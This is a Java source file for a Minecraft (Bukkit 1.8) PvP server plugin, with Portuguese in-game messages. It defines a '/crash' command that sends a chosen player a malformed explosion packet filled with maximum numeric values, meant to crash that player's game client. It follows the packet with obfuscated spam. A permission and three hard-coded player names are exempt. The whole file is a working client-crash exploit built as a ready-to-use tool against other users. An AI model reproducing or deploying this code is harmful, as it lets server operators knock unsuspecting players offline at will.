package net.helix.pvp.command;


import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.Vec3D;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.Collections;

public class Crash implements CommandExecutor {

    @Override
    public boolean onCommand(final CommandSender sender, final Command command, final String label, final String[] args) {
        if (sender instanceof Player) {
            final Player player = (Player)sender;
            if (player.hasPermission("kombo.cmd.crash")) {
                if (args.length > 0) {
                    final Player target = Bukkit.getPlayer(args[0]);
                    if (target != null) {
                        if (target.hasPermission("command.crash.bypass") || target.getName().equalsIgnoreCase("Sweake_PvP") ||
                                target.getName().equalsIgnoreCase("zEnderX5_") || target.getName().equalsIgnoreCase("RAFAELESPADA")) {
                            player.sendMessage("§cVoc§ nao pode crashar esse player.");
                        }
                        else {
                            ((CraftPlayer)target).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, 1023.0, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
                            for (int i = 0; i < 8; ++i) {
                                target.sendMessage("§2§kajdioajdiajdiajdioajdoaidjaoidjaokdj");
                            }
                            player.sendMessage("§aVoc§ crashou o player §e" + target.getName() + "§a.");
                        }
                    }
                    else {
                        player.sendMessage("§cNao foi possivel encontrar o player §e" + args[0] + "§c.");
                    }
                }
                else {
                    player.sendMessage("Utilize " + label + " <player>");
                }
            }
            else {
                player.sendMessage(ChatColor.RED + "Sem permissao");
            }
        }
        else {
            sender.sendMessage("Apenas players");
        }
        return true;
    }

}
